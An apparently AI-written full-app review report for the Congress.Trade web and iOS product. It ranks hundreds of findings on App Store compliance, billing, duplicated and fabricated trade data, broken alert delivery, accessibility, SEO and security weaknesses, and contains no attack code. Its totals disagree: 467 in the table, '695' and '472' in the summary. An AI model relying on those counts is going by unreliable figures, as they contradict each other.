# Congress.Trade — full-app expert panel review (2026-08-19)

Seat: CLAUDE.  Scope: desktop web, mobile web, iOS on `main` (simulator) and the shipped App Store build 1.0.75.  24 expert lenses; every finding adversarially verified by a second agent (3 refuted and dropped, 222 duplicates merged), then re-checked against `main` as of 2026-08-19 — 5 had already been fixed by other agents and were moved to Appendix C.  Ranked best-first by severity, confidence, user impact and effort.  Interactive version (filter by severity / surface / quick win, search evidence): https://claude.ai/code/artifact/52e573d8-66f5-4a59-8421-7d004b46e5ab  Evidence set (screenshots, logs, Lighthouse, per-lens JSON) lives outside the repo in `.review-shots/` on the owner's Mac.

| P0 · Blocker | P1 · High | P2 · Medium | P3 · Low | P4 · Idea | Total | Quick wins |
|---:|---:|---:|---:|---:|---:|---:|
| 10 | 48 | 148 | 173 | 88 | 467 | 134 |

## Executive summary

Congress.Trade is further along than a 695-finding review suggests:  the ingestion and extraction pipeline, the Trends analytics layer, the Delivery engine and a complete SwiftUI client all exist and mostly work, and only two candidate findings were refuted outright.  What is actually broken is concentrated in three places -- the App Store submission, the money path, and the trustworthiness of the numbers -- and each of those blocks something you are trying to do right now.  The binary sitting in App Review carries the classic Guideline 3.1.1 rejection (APPSTORECOMPLIANCE-01: a Premium-gated 'Filing PDF' button that opens Safari on the web Stripe checkout) and no in-app account deletion (LEGALCOMPLIANCE-01, Guideline 5.1.1(v), also a GDPR/CCPA promise in your own Privacy §6), while the review notes describe a build and an Email Link sign-in that no longer exist (APPSTORECOMPLIANCE-04).  Current main is worse than the shipped 1.0.75:  every politician detail sheet 404s because the new query string is percent-encoded into the path (APICONTRACT-01), and main did not compile for roughly twenty hours because the iOS build job is advisory and the 71 unit tests never run in CI (IOSENGINEERING-14).  Delivery -- the thing Premium actually sells -- does not deliver:  the one-time webhook/SSE secret is never shown to anyone since inline command execution landed (DELIVERYALERTS-01), the APNs fan-out query joins a column that does not exist so every push tick throws (DELIVERYALERTS-02), member filters accept names the matcher can never resolve so the subscription looks active and sends nothing (DELIVERYALERTS-06), and 57,321 quarantined events have been dropped permanently under a UI that says they are held 'until the target recovers' (DELIVERYALERTS-07).  When push does fire it goes to every registered device with no entitlement, watchlist or throttle, including the operator 'Review needed' stream with internal doc ids (DELIVERYALERTS-04, DELIVERYALERTS-03).  The money path leaks in both directions:  Apple's App Store Server Notifications are mounted only in the dead src/app.ts so production 404s them (ENGINEERINGQUALITY-02), Apple REFUND is never applied and a Sandbox-signed JWS is accepted as a live purchase (BILLING-03), every Stripe checkout grants a fresh 14-day trial so cancel-and-resubscribe is free forever (BILLING-07), and a Premium user can start a second paid subscription from /pricing (BILLING-02).  The numbers are not yet defensible:  the same real-world trade is stored two or three times under different source values and summed as separate trades everywhere (DATACORRECTNESS-01), the competitor backfill stamps a fabricated $1,001-$15,000 bracket and filed_date = trade date on 100% of its rows and then publishes them as first-class trades (DATACORRECTNESS-02), and option premiums are added to stock dollars so 46% of the headline 'net +$8.2m' is two Pelosi call positions (DATACORRECTNESS-10).  The most alarming single data finding is that the authoritative human path is lossy:  a 'manual' review resolution published 1 of 3 disclosed transactions on an OPM Director's OGE filing and silently dropped a $1,000,001-$5,000,000 line (GAPEXTRACTIONGROUNDTRUTHAUDIT-01), and an OCR safety filter zeroes out entire legible House filings with no recovery path (GAPEXTRACTIONGROUNDTRUTHAUDIT-02).  What is quietly costing you:  every merge to main, docs-only effort-log commits included, hard-downs the site for 40-60 seconds -- 64 recorded 502 incidents in seven days, four of them inside the 45-minute capture window (OPSRELIABILITY-01) -- and you cannot see any of it, because '#sentry' resolves to a dummy module under Deno and container logs are deleted on every redeploy (ENGINEERINGQUALITY-01).  Web 'Sign In with Apple' has never worked in production and is offered at equal prominence beside Google (QABUGHUNT-02), which also means an iOS subscriber who paid through Apple cannot get onto the web product at all.  Conversion is being thrown away on purpose:  Start Free Trial sends the highest-intent visitor through Google and returns them to /?login=ok with plan, view, filters and open drawer discarded (GROWTHONBOARDING-02), nothing is instrumented so you cannot see it happen (GROWTHONBOARDING-04), robots.txt disallows /api/ so Googlebot indexes a data-less shell (SEOSOCIAL-01), and there is no crawlable link or sitemap for any of the ~381 politicians or ~4,200 assets while CapitolTrades and Quiver rank for exactly those queries (SEOSOCIAL-02).  One malformed Google Fonts axis tuple 400s the whole stylesheet, so Inter has never loaded on the production site and every visitor sees system fallbacks (QABUGHUNT-01) -- a one-line fix that silently changed how the entire product looks.  Accessibility fails on the money path itself (the Monthly/Annual plan cards are click-only divs with no role, name or keyboard access -- WEBA11Y-03, open since the 2026-07-28 review) and the Trades table's semantics are destroyed by role=button on rows and headers (WEBA11Y-01).  Two legal items are worth an actual lawyer hour rather than a commit:  there is no 'not affiliated with the U.S.  Congress or any government agency' statement anywhere on a product called Congress.Trade with a bald-eagle lockup (LEGALCOMPLIANCE-04), and executive-branch OGE 278-T filings are redistributed in a paid product with no 5 U.S.C. §13107(c) posture while ToS §1 still says the dataset is Congress-only (LEGALCOMPLIANCE-05).  Fix these ten first, in this order:  LEGALCOMPLIANCE-01, APPSTORECOMPLIANCE-01, APICONTRACT-01, DELIVERYALERTS-02, DELIVERYALERTS-01, ENGINEERINGQUALITY-02, BILLING-03, OPSRELIABILITY-01, DATACORRECTNESS-01, DATACORRECTNESS-02 -- five of them are S-effort one-file changes, and only account deletion and the duplicate-row cleanup are real projects.  Then spend the next day on the two things that stop all of this recurring:  make the iOS compile+test job a required check (IOSENGINEERING-14) and give Deno a real Sentry build (ENGINEERINGQUALITY-01), because 65 of these 472 findings were already written down in the July and August reviews and shipped anyway.

## Themes

- **App Store review blockers and Apple platform compliance** (9) — The iOS binary in review still steers users to a web Stripe checkout, has no in-app account deletion, and ships review notes that describe a build and a sign-in method that no longer exist.  These are the items that decide whether the app ships at all.
- **Money path: subscriptions, entitlements and refunds** (19) — Apple's server notifications never reach production, refunds and sandbox purchases are mishandled, and nothing in either client tells a customer what they are paying, when it renews, or how to cancel.  Every defect here is either lost revenue or a chargeback.
- **Data integrity: duplicates, fabricated amounts and filer identity** (33) — The corpus holds the same real-world trade two or three times under different sources, one of which stamps fabricated amounts and filing dates, and filer identities are split and mislabelled.  Every headline number on Trends inherits those errors.
- **Delivery and alerts: the paid feature does not deliver** (29) — The one-time webhook secret is never shown, the APNs query throws on every tick, member filters can never match, and quarantined events are dropped permanently.  The $5/mo promise is largely unredeemable today.
- **Client/API contract drift between web, iOS and the docs** (17) — One contract, three divergent readings: iOS 404s every politician, decodes fields the server never sends, and relabels rolling windows as calendar years, while the published docs describe behaviour the server no longer has.
- **iOS app quality: correctness, native patterns and polish** (68) — Beyond the compliance blockers the app is a competent but web-shaped client: dead-end sheets, pager chrome instead of native lists, stale-data flashes, error states with no retry, and a long tail of HIG deviations.
- **Accessibility on web and iOS** (57) — Both clients fail the basics on their most important surfaces: the money path is mouse-only on web, table semantics are destroyed by role=button, and iOS announces controls 2-4 times with sub-44pt targets and semantic colours that fail contrast.
- **Web UX: navigation, sharing, filtering and error states** (58) — Back never works, drawers are unshareable, sorts and searches quietly apply to one page of 50, and failures after first load are swallowed.  Users cannot trust that what they see is what they asked for.
- **Web performance and caching** (18) — A 715 KB uncacheable document with no build step, edge caching effectively off, CLS in the 'poor' band, and a font request that 400s on every page load.
- **Engineering foundations, reliability and operations** (31) — Production has no error tracking, every merge takes the site down, the iOS gate is advisory, and half the pipeline's degraded states page nobody.  This is the layer that lets the other themes regress.
- **Security and exposure** (19) — Nothing here is a live cross-user breach, but the origin is reachable around Cloudflare, the operator console ships to anonymous visitors, the master admin token lives in localStorage, and health endpoints read as an ops dashboard.
- **Legal, licensing and disclosure** (20) — No account deletion, no affiliation disclaimer, ToS and Privacy that predate Apple sign-in and IAP, and three third-party data/licence obligations (CC BY-SA photos, logo.dev, FMP) that are being carried without attribution.
- **Growth, discovery, SEO and sharing** (33) — The product is invisible to search, its most shareable object unfurls as a logo, conversion intent is thrown away at sign-in, and there is no funnel instrumentation to notice any of it.
- **Copy, terminology and the visual system** (56) — The owner's own conventions (two spaces, 'Trades tab' not 'feed', wide separators, lowercase k/m/b) are violated in dozens of strings, the web font never loads, and web and iOS present the same data in two visual languages.

## Top 40 (by rank)

1. **[P0]** No account-deletion path anywhere (App Store 5.1.1(v), GDPR/CCPA erasure promised by Privacy §6) — _Cross-surface, effort M_
2. **[P0]** iOS 'Filing PDF' button routes non-Premium users to the web Stripe paywall (3.1.1 steering path survives #1984) — _iOS, effort S, quick win_
3. **[P0]** APNs fan-out SQL joins `filers f ON f.id` but filers has no `id` column → every push tick throws — _Backend, effort S, quick win_
4. **[P0]** One-time delivery secret is never shown: inline command success skips the claim on web and iOS — _Cross-surface, effort S, quick win_
5. **[P0]** Apple App Store Server Notifications route (/api/webhooks/apple) is only mounted in the dead src/app.ts, not in the production entry index.ts — _Backend, effort S, quick win_
6. **[P0]** Apple REFUND not applied, Sandbox JWS accepted in production, Stripe webhook ignores livemode/refund/dispute (tracked in PR #1981) — _Backend, effort M_
7. **[P0]** Every merge to main (including docs-only effort-log close-outs) takes the site down for ~60 s; 64 recorded 502 incidents in 7 days — _Cross-surface, effort M_
8. **[P0]** Same real-world trade stored 2-3x across primary/manual/local_mac/competitor_backfill and counted as separate trades everywhere — _Cross-surface, effort L_
9. **[P0]** competitor_backfill rows carry fabricated amounts ($1,001–$15,000 on 100% of rows) and filed_date = trade date (lag 0, 'on_time') — _Cross-surface, effort M_
10. **[P0]** Human 'manual' review resolution published only 1 of 3 disclosed transactions for an OPM Director's OGE filing, omitting a $1,000,001-$5,000,000 stock sale — _Backend, effort S, quick win_
11. **[P1]** 'Sign In with Apple' on the web is a dead button — it always redirects to ?auth_error=apple_web_not_configured — _Web, effort S, quick win_
12. **[P1]** No web font ever loads: the Google Fonts <link> URL is malformed and returns HTTP 400 — _Web, effort S, quick win_
13. **[P1]** Binary in App Review (1.0.15 / 202608150702) predates the 3.1.1 fixes the review notes describe — _iOS, effort S, quick win_
14. **[P1]** Premium iOS subscribers cannot open the filing PDF at all -- openURL sends Safari without the Bearer session — _iOS, effort M_
15. **[P1]** Push alerts ignore watchlist / notificationSettings and Premium: every device gets every trade — _iOS, effort M_
16. **[P1]** 'Review needed' operator pushes are fanned out to every end-user device — _iOS, effort S, quick win_
17. **[P1]** Net Flow / Approx. Volume / ticker net-flow ranking count option premiums as stock dollars — 46% of the +$8.2m headline Net Flow is two Pelosi call-option buys — _Cross-surface, effort S, quick win_
18. **[P1]** Production error tracking is a no-op: '#sentry' resolves to sentryDummy.ts under the Deno runtime — _Backend, effort M_
19. **[P1]** No duplicate-subscription guard: a Premium user can start a second Stripe checkout from /pricing (and an Apple subscriber can buy Stripe too) — _Cross-surface, effort S, quick win_
20. **[P1]** Quarantined deliveries are permanently dropped (57,321 as of 2026-08-19) while the alert says 'until the target recovers' — _Backend, effort M_
21. **[P1]** 'This Calendar Year' and 'Last Calendar Year' on Trends both show trailing-365-day analytics (iOS maps them to window=365d although the API supports this_cy/last_cy) — _iOS, effort S, quick win_
22. **[P1]** Trends failure state has no retry control, hides every section behind six '—' tiles, shows the generic 'Request failed', and never auto-recovers because polling is only armed after a successful feed — _iOS, effort S, quick win_
23. **[P1]** Premium sheet is a dead end when signed out: lowercase 'sign in first' caption, no sign-in button, no Restore Purchases, no term/renewal line — _iOS, effort S, quick win_
24. **[P1]** Executive-branch (OGE 278-T) filings are redistributed in a paid product with no EIGA §105(c) posture, and ToS §1 still says Congress-only — _Cross-surface, effort M_
25. **[P1]** No 'not affiliated with the U.S. Congress / any government agency' disclaimer on web, iOS, legal pages or share cards — _Cross-surface, effort S, quick win_
26. **[P1]** Origin server is directly reachable, bypassing Cloudflare (WAF, bot rules, rate limits, cf-connecting-ip trust) — _Backend, effort M_
27. **[P1]** iOS CI is compile-only and not a required check: the 71 unit tests never run in CI, and three red iOS builds were merged on 2026-08-15/16 leaving main uncompilable for far longer than one workday — _iOS, effort M_
28. **[P1]** Member filter accepts names on both clients but matching requires bioguide ids → silently delivers nothing — _Cross-surface, effort M_
29. **[P1]** Upgrade intent is lost across sign-in: Start Free Trial → Google → lands on /?login=ok with no pricing/checkout resume — _Web, effort S, quick win_
30. **[P1]** Zero funnel instrumentation: no event analytics, no server-side funnel counters — conversion is unmeasurable — _Cross-surface, effort M_
31. **[P2]** Executive filers' position (`title`) never reaches iOS: absent from the feed DTO and undecoded from /members and /member — _Cross-surface, effort M_
32. **[P1]** robots.txt Disallow: /api/ blocks Googlebot from every data XHR, so the indexed page is a data-less shell — _Web, effort S, quick win_
33. **[P1]** No crawlable <a href> to any politician, ticker, trade or view URL — only / is discoverable — _Web, effort M_
34. **[P1]** Premium plan selection (Monthly/Annual) is mouse-only: click-handler divs with no role, name, state or keyboard access — _Web, effort S, quick win_
35. **[P1]** Party filter does not partition: All = 2,178 but D+R+O = 2,166; 'Other' returns 0 while 12 trades have no party — _Cross-surface, effort S, quick win_
36. **[P1]** Trades column sort (Amount, Type, Politician, Asset, Country) only reorders the 50 loaded rows, while the header arrows imply a corpus sort — _Web · desktop, effort M_
37. **[P1]** Browser Back never works inside the app: tabs, filters and drawers all use replaceState and there is no popstate handler — _Web, effort M_
38. **[P1]** iOS ConflictCandidateItem requires fields the /api/analytics/conflicts route never sends → Committee Sector Conflicts section silently never renders — _iOS, effort S, quick win_
39. **[P1]** Pelosi drawer 'Performance vs S&P 500' is computed from two fabricated competitor duplicates of an options trade — _Web · desktop, effort S, quick win_
40. **[P1]** first_seen_at precedes the official filing date (and the trade date) for ~2.5% of rows — 'SEEN Jul 30' before 'TRADED Aug 5' — _Cross-surface, effort S, quick win_

## Quick wins (S effort, P0–P2)

- #2 [P0] iOS 'Filing PDF' button routes non-Premium users to the web Stripe paywall (3.1.1 steering path survives #1984)
- #3 [P0] APNs fan-out SQL joins `filers f ON f.id` but filers has no `id` column → every push tick throws
- #4 [P0] One-time delivery secret is never shown: inline command success skips the claim on web and iOS
- #5 [P0] Apple App Store Server Notifications route (/api/webhooks/apple) is only mounted in the dead src/app.ts, not in the production entry index.ts
- #10 [P0] Human 'manual' review resolution published only 1 of 3 disclosed transactions for an OPM Director's OGE filing, omitting a $1,000,001-$5,000,000 stock sale
- #11 [P1] 'Sign In with Apple' on the web is a dead button — it always redirects to ?auth_error=apple_web_not_configured
- #12 [P1] No web font ever loads: the Google Fonts <link> URL is malformed and returns HTTP 400
- #13 [P1] Binary in App Review (1.0.15 / 202608150702) predates the 3.1.1 fixes the review notes describe
- #16 [P1] 'Review needed' operator pushes are fanned out to every end-user device
- #17 [P1] Net Flow / Approx. Volume / ticker net-flow ranking count option premiums as stock dollars — 46% of the +$8.2m headline Net Flow is two Pelosi call-option buys
- #19 [P1] No duplicate-subscription guard: a Premium user can start a second Stripe checkout from /pricing (and an Apple subscriber can buy Stripe too)
- #21 [P1] 'This Calendar Year' and 'Last Calendar Year' on Trends both show trailing-365-day analytics (iOS maps them to window=365d although the API supports this_cy/last_cy)
- #22 [P1] Trends failure state has no retry control, hides every section behind six '—' tiles, shows the generic 'Request failed', and never auto-recovers because polling is only armed after a successful feed
- #23 [P1] Premium sheet is a dead end when signed out: lowercase 'sign in first' caption, no sign-in button, no Restore Purchases, no term/renewal line
- #25 [P1] No 'not affiliated with the U.S. Congress / any government agency' disclaimer on web, iOS, legal pages or share cards
- #29 [P1] Upgrade intent is lost across sign-in: Start Free Trial → Google → lands on /?login=ok with no pricing/checkout resume
- #32 [P1] robots.txt Disallow: /api/ blocks Googlebot from every data XHR, so the indexed page is a data-less shell
- #34 [P1] Premium plan selection (Monthly/Annual) is mouse-only: click-handler divs with no role, name, state or keyboard access
- #35 [P1] Party filter does not partition: All = 2,178 but D+R+O = 2,166; 'Other' returns 0 while 12 trades have no party
- #38 [P1] iOS ConflictCandidateItem requires fields the /api/analytics/conflicts route never sends → Committee Sector Conflicts section silently never renders
- #39 [P1] Pelosi drawer 'Performance vs S&P 500' is computed from two fabricated competitor duplicates of an options trade
- #40 [P1] first_seen_at precedes the official filing date (and the trade date) for ~2.5% of rows — 'SEEN Jul 30' before 'TRADED Aug 5'
- #41 [P1] Web copy tells webhook consumers to dedupe on docId — that drops every trade after the first in a filing
- #42 [P1] SSE opened from the provided URL replays the entire history before going live
- #43 [P1] Privacy Policy omits Apple (Sign in, IAP, APNs), Sentry, OpenRouter/LLM extraction, Cloudflare Web Analytics and usage telemetry
- #44 [P1] ToS payment/cancellation/refund terms are Stripe-only; Apple In-App Purchase path is unaddressed
- #45 [P1] Semantic green/red/orange text fails contrast in light mode (green 1.99:1)
- #46 [P1] Trades search slot: container accessibilityLabel makes Reload button read 'Request failed' and hides the trade count
- #47 [P1] Mobile trade cards' aria-label hides Buy/Sell, amount and date from screen readers
- #48 [P1] Politician and ticker drawers dead-end at 10–15 "recent trades" with no route to the full list on the Trades tab
- #59 [P1] Trades search field is swapped out for the 'Updating results…' row on the first keystroke, dismissing the keyboard mid-typing
- #60 [P2] /api/transactions parses `type` single-valued while the web sends CSV — web Buy+Sell filter silently shows everything; iOS feed filters correctly
- #61 [P2] Feed `source` leaks internal pipeline identities (`local_mac`, `server_cpu`) outside the documented enum
- #62 [P2] Docs/openapi/type comments still say executive rows are excluded by default — the code now includes them
- #63 [P2] iOS decodes a null transaction.type as "B" (Buy) — contradicts the documented 'never assume Buy' rule
- #64 [P2] Web 'Manage Subscription' for Apple-sourced Premium users calls the Stripe portal and fails with a 400 toast
- #65 [P2] iOS paywall sells 'Push notifications when a new filing lands' as Premium, but APNs fan-out goes to every signed-in device
- #66 [P2] Every Stripe checkout grants a new 14-day trial — cancelled users can re-trial indefinitely
- #67 [P2] iOS paywall hard-codes '2-week free trial' and USD prices regardless of intro-offer eligibility or storefront
- #68 [P2] sector-flow GROUP BY binds to raw sr.sector, so canonical sector labels still appear 2-3 times per response
- #69 [P2] iOS 'Net Flow by Sector' ranks by signed net and folds the largest flow (Energy −$15.5m) into 'Other (7 sectors) −$16.3m'
- #70 [P2] Free-text strings stored in the ticker column ('MUNICIPAL-SECURITY', 'PART OF MY SPOUSE'S RETIREMENT PORTFOLIO.') count as resolved assets
- #71 [P2] 'Past Day' and 'Past Week' windows are structurally empty and 'Past Month' excludes trades disclosed this month
- #72 [P2] Rising Activity semantics are unlabeled and partly wrong: '0 → 13' is prior-window vs current-window, `last_cy` compares trailing 365d, 'All Time' compares 90d
- #73 [P2] /member/:id/performance does not resolve bioguide ids, so the same politician shows empty performance when opened by ?member=P000197 and populated via slug
- #74 [P2] Ticker drawer backtest inherits the Trends window, so it shows 'n<5' everywhere and a misleading 'price cache backfills' excuse
- #75 [P2] Webhook retry horizon is ~75 seconds, not the 'retrying automatically' robustness implied
- #76 [P2] Webhook payload omits politician name, chamber, party and filedDate (SSE replay has them)
- #77 [P2] No test/ping delivery for a new webhook or SSE target
- #78 [P2] TypeScript runs with strict:false and only a handful of errors stand between the codebase and strict mode
- #79 [P2] 137 MB / 3,287 files of vendor node_modules (incl. darwin-arm64 binaries) are committed and copied into the Linux Docker image
- #80 [P2] Config registry has drifted: doc is a month old, keys missing from the doc, and env-only knobs are invisible to /config-sources
- #81 [P2] No landing/hero value proposition for a first anonymous visit; meta copy speaks to engineers
- #82 [P2] APNs token never re-registered at launch and backend sync waits for the next feed poll; stale tokens survive restores
- #83 [P2] Trade Details sheet opens at medium detent showing only the hero (logo, ticker, name, pill) -- no data above the fold
- #84 [P2] Header ⓘ is labelled "About Congress.Trade" but only toggles the disclaimer banner; ≡ "Menu" is a web hamburger for account
- #85 [P2] Headline Net Flow +$8.2m contradicts sector/market-cap breakdowns that both sum to about −$11.0m, with no on-screen scope note
- #86 [P2] Paging to the next page (Trades and Directory) keeps the scroll position at the bottom of the list
- #87 [P2] Trends keeps showing the previous filter's numbers for ~2 s with no loading indicator after a chip change
- #88 [P2] Directory and Delivery drop the ⓘ / word-mark / ≡ chrome, so Account/Premium/theme/CSV are unreachable from half the tabs
- #89 [P2] Politician sheet renders an empty 'PERFORMANCE VS S&P 500' card (caveat only) and has no summary tiles
- #90 [P2] Buys vs Sells week labels are one week early: iOS decodes the server's SQLite %W bucket ('2026-W31') as an ISO/Gregorian weekOfYear, web decodes it correctly
- #91 [P2] Ticker sheet 'Recent Trades' are in ingest (cursor) order, not date order — the client passes no sort and the /ticker route defaults to cursor unlike /member
- #92 [P2] Any StoreKit purchase failure — including ones before Apple charged anything — is captioned 'Apple took the purchase, but Congress.Trade could not confirm it yet'
- #93 [P2] CC BY-SA member photo shipped with attribution display disabled (licence non-compliance)
- #94 [P2] Web pricing modal shows 'Start Free Trial' without auto-renewal / post-trial price disclosure or Terms link
- #95 [P2] Privacy Policy lacks GDPR Art. 13 essentials: controller address, legal bases, retention periods, supervisory-authority complaint right, named cookies
- #96 [P2] Google Fonts requested from fonts.googleapis.com on every page (visitor IP to Google) and not disclosed; request also 400s so it delivers nothing
- #97 [P2] Web dashboard has no freshness or connection-status indicator; the JS writes to #livePill/#kpiToday elements that no longer exist
- #98 [P2] Trades initial-load error banner has no retry, never auto-recovers, and says 'live feed'
- #99 [P2] Trends shows up to 14 'Could not load: HTTP 5xx' cells during an outage and never retries or auto-refreshes
- #100 [P2] Latency-probe monitor has been DOWN for 5 days because the Unusual Whales and Quiver keys are rejected (401/403); a stuck-DOWN monitor cannot alert on the next provider failure
- #101 [P2] The public status page custom domain (status.jays.services) returns HTTP 525 and is not linked from the site or app
- #102 [P2] Deep-link params (?ticker / ?member / ?trade / ?pricing / ?auth_error) are never removed on close and survive tab switches — refresh or share re-opens the drawer/modal, and a failed Apple sign-in re-opens the login modal forever
- #103 [P2] Anonymous visitors can activate the operator Review / Admin views via ?view=review, ?view=admin, /admin (or a stale ct-active-tab) — pages render but never load ('Loading…' forever, 6×401)
- #104 [P2] Filter chip labels announced 2-4 times each (label applied to chip children)
- #105 [P2] Buys vs Sells chart conveys buy/sell only by green vs red — no legend, no per-segment numbers
- #106 [P2] Filter/sort/pager chips are ~28-30pt tall (below the 44pt minimum tap target); header buttons capped at 34pt
- #107 [P2] Party shown only as an emoji in Trade Details; chamber only as a background tint
- #108 [P2] Delivery chamber FilterChips expose no selected state to VoiceOver
- #109 [P2] No sitemap.xml and robots.txt has no Sitemap: directive
- #110 [P2] <title> and meta description are identical on every view and drawer; document.title never changes
- #111 [P2] og:title/og:description echo arbitrary ?member= / ?ticker= text — branded unfurl content spoofing
- #112 [P2] Canonical URL is the raw request URL — every filter/utm/case/unknown-view variant self-canonicalizes
- #113 [P2] 404 is a bare text/plain page; natural paths (/trades, /people, /trends, /feed.xml, /politician/…) all 404 with no redirect
- #114 [P2] RSS is not autodiscoverable: no <link rel=alternate> in <head>, and it lives under robots-disallowed, noindex /api/
- #115 [P2] Public web prose still single-spaced between sentences in ~30 strings
- #116 [P2] iOS copy single-spaced between sentences in ~30 strings
- #117 [P2] "feed" terminology still used in user-facing web copy (banner, loading, error, pricing feature, meta, push body)
- #118 [P2] OG/meta descriptions say "House & Senate" only, lowercase "congressional", and "feed"
- #119 [P2] Web CSV export copy implies a limited export is free ("Full-history export is Premium") but every CSV request requires Premium
- #120 [P2] Trade drawer "Filing Notes" dumps raw JSON keys/values ("CAP GAINS OVER200: false", "ASSET TYPE NAME")
- #121 [P2] Push notification title calls Exchange trades "bought"; body uses "feed"
- #122 [P2] Rising Activity table is wider than its card at 1440px — the 4th 'Politicians' column is clipped with no scroll affordance
- #123 [P2] Dark mode: transparent-background ticker logos with dark glyphs disappear (Estée Lauder) on both web and iOS
- #124 [P2] Desktop Trades table shows dates as '8-5-26' while every other surface uses 'Aug 5, 2026'
- #125 [P2] Desktop Trades search input is narrower than its own placeholder ('Search name, ticker, sta')
- #126 [P2] Two competing Buy/Sell pill styles on web (solid gradient + glow vs tinted chip) and a third on iOS
- #127 [P2] Mobile web bottom tab bar mixes colour emoji with a text glyph and differs from iOS SF Symbols
- #128 [P2] iOS Delivery and Account forms lose their grouped-card affordance (white rows on white background)
- #129 [P2] Delivery create form: channel/branch selects have no accessible name and text inputs rely on placeholder/title only
- #130 [P2] Directory column-sort headers are not keyboard operable (onclick on <th> only)
- #131 [P2] Drawer (trade / member / ticker) is not a dialog: no role, aria-modal or accessible name, background not hidden
- #132 [P2] 'Copy link to …' controls are href-less <a> elements: not focusable or operable by keyboard
- #133 [P2] Filter buttons: aria-label 'Filter by branch/party/trade type' overrides the visible value ('All', 'House', 'Buys'), so the current filter is neither in the name nor announced
- #134 [P2] Dark theme: white text on accent/buy/sell/exchange fills fails 4.5:1 (primary buttons, Buy/Sell pills, active filter items)
- #135 [P2] Focus indicators are low-contrast or colour-only on Trends (24%/45% alpha rings, opacity-only chart columns, colour-only info tips)
- #136 [P2] Live-region misuse: whole mobile card list is aria-live while counts, filter results, errors and modal messages are not announced
- #137 [P2] Party is conveyed only by an avatar ring colour with no text or accessible equivalent in the desktop Trades table and drawer member cells
- #138 [P2] Column reorder in the Columns dialog is drag-and-drop only (no keyboard/single-pointer alternative)
- #139 [P2] Touch targets below 24×24: mobile #/$ metric toggles (~17×19 px) and 22-px-tall inner asset targets
- #140 [P2] Trades card meta line clips the last item mid-word ('9d a', '2d ag') because .fc-row2 is display:flex with text-overflow:ellipsis
- #141 [P2] No scroll lock or overscroll containment when a bottom sheet / modal is open — background page scroll-chains on touch
- #142 [P2] Selects keep 12px font on phones (time-window pill, mobile Sort, rows-per-page) → iOS Safari auto-zooms the page on focus
- #143 [P2] Filter chip row is overflow:visible inside html overflow-x:clip → 4th (trade-type) chip is clipped and unreachable on ≤360px phones
- #144 [P2] Trends dashboard on phone is ~10-12k CSS px tall with every <details> section default-open (still open since 2026-08-10 review P1-7)
- #145 [P2] Ticker logos are 256x256 PNGs (up to 58 KB each) rendered in a 22 px box — logo images dominate Trades transfer
- #146 [P2] Trends analytics fetches are serialized behind /auth/me — the 14 requests only start after the auth round-trip completes
- #147 [P2] Header wordmark is a 1670x334 PNG (161 KB light / 136 KB dark) displayed at 40 px tall
- #148 [P2] Opening a drawer by click never updates the URL; only the buried "Copy link" produces a shareable address, and it drops the current view
- #149 [P2] Pager advertises unreachable pages: "Page 1 of 1,798" at All Time while anonymous browsing stops at page 41
- #150 [P2] Directory hides the shared time/branch/party/side filter bar, yet the member drawer opened from it reports "Trade Stats (3 Months)" using that hidden state
- #151 [P2] Drill-in inside the drawer (trade → politician → company) has no Back; only Close, which discards the whole stack
- #152 [P2] Filter or page fetch failures after first load are swallowed: no error state, no toast, stale rows remain
- #153 [P2] text_pdf extractor's last-row boundary bug pollutes supplementalText/location/rawText with unrelated document-footer, certification, and signature-block text on every text_pdf filing
- #193 [P2] Post-checkout landing is a toast on Trends — no 'set up your first delivery' onboarding and possible entitlement race
- #194 [P2] Ticker logos via logo.dev served with no attribution; confirm plan tier allows unattributed use
- #195 [P2] FMP market data displayed and re-shared without attribution or a documented redistribution licence
- #196 [P2] iOS paywall lacks explicit auto-renewal disclosure required by Apple for auto-renewable subscriptions
- #197 [P2] 'degraded' pipeline states never page anyone: 80 dead-lettered outbox items right now, 114-item review backlog for days
- #198 [P2] Admin review UI builds inline onclick handlers with esc()-escaped IDs — HTML escaping does not protect a JS string context
- #199 [P2] Bottom sheet uses height:88vh inside a fixed inset:0 container — on iOS Safari with toolbars visible the sheet top (title + Close) can sit above the visible area
- #200 [P2] iPad Safari falls into the phone layout: mobile block also matches (hover:none) and (pointer:coarse)
- #201 [P2] Changing page does not reset the inner table scroll position, so Next from the bottom pager lands mid/bottom of the new page

## Still open from prior reviews

- #1 [P0] No account-deletion path anywhere (App Store 5.1.1(v), GDPR/CCPA erasure promised by Privacy §6) — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md §3); tracked-in-PR-#1979 (BS-L3)
- #5 [P0] Apple App Store Server Notifications route (/api/webhooks/apple) is only mounted in the dead src/app.ts, not in the production entry index.ts — new (root cause C5 dead router still-open-since-2026-07-28)
- #7 [P0] Every merge to main (including docs-only effort-log close-outs) takes the site down for ~60 s; 64 recorded 502 incidents in 7 days — still-open-since-2026-08-12 (docs/rollouts/2026-08-12-deploy-downtime-gap.md; overlap fix tracked in open PR #1964)
- #8 [P0] Same real-world trade stored 2-3x across primary/manual/local_mac/competitor_backfill and counted as separate trades everywhere — new
- #11 [P1] 'Sign In with Apple' on the web is a dead button — it always redirects to ?auth_error=apple_web_not_configured — new
- #18 [P1] Production error tracking is a no-op: '#sentry' resolves to sentryDummy.ts under the Deno runtime — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md P0-4)
- #27 [P1] iOS CI is compile-only and not a required check: the 71 unit tests never run in CI, and three red iOS builds were merged on 2026-08-15/16 leaving main uncompilable for far longer than one workday — still-open-since-2026-07-13 (IMPROVEMENT-PLAN P0.4)
- #28 [P1] Member filter accepts names on both clients but matching requires bioguide ids → silently delivers nothing — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md I9)
- #30 [P1] Zero funnel instrumentation: no event analytics, no server-side funnel counters — conversion is unmeasurable — still-open-since-2026-08-06 (docs/reviews/2026-08-06-full-product-review.md #1457 noted 'RUM analytics silently dead'; root GA removal since)
- #33 [P1] No crawlable <a href> to any politician, ticker, trade or view URL — only / is discoverable — new
- #34 [P1] Premium plan selection (Monthly/Annual) is mouse-only: click-handler divs with no role, name, state or keyboard access — still-open-since-2026-07-28 (docs/reviews/2026-07-28-full-app-review.md W10)
- #38 [P1] iOS ConflictCandidateItem requires fields the /api/analytics/conflicts route never sends → Committee Sector Conflicts section silently never renders — new
- #45 [P1] Semantic green/red/orange text fails contrast in light mode (green 1.99:1) — still-open-since-2026-07-13 (clients/ios/IMPROVEMENT-PLAN.md § P2 'sufficient contrast', line 97)
